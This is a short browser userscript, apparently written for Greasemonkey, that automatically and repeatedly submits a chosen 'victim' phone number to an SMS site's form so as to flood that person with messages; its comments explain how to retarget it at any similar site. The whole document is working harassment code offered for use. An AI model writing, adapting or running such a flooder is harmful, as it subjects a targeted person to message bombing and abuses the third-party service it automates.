// ==UserScript==
// @name          Anonymous ANYSITE flooder (make urself)
// @namespace     Yash
// @description   flooder sms
// @include       http://*freesms8.com/*
//                ^^ EDIT THIS AND ADD THE SITE NAME U WANT TO FLOOD
// ==/UserScript==

var victim=0 //Enter victims number here
var delay=1000; // Enter delay in milliseconds if required
var textboxid='ctl00_BodyPlaceHolder_MobileTb';
//^^ this is the id of the text box where u put the mobile no.
var submitbuttonid='ctl00_BodyPlaceHolder_SubmitBt';
//^^ this is the id of the submit button
var initialurl="http://www.freesms8.com/StopFreesms.aspx";
//^^ This is the url where u enter the no.
var finalurl="http://www.freesms8.com/StopFreesms_verify.aspx";
//^^ this is the url of the page where the site takes u after submitting
if(document.location==initialurl)
{
document.getElementById(textboxid).value=victim;
document.getElementById(submitbuttonid).click();
}
if(document.location==finalurl)
setTimeout("document.location=initialurl",delay);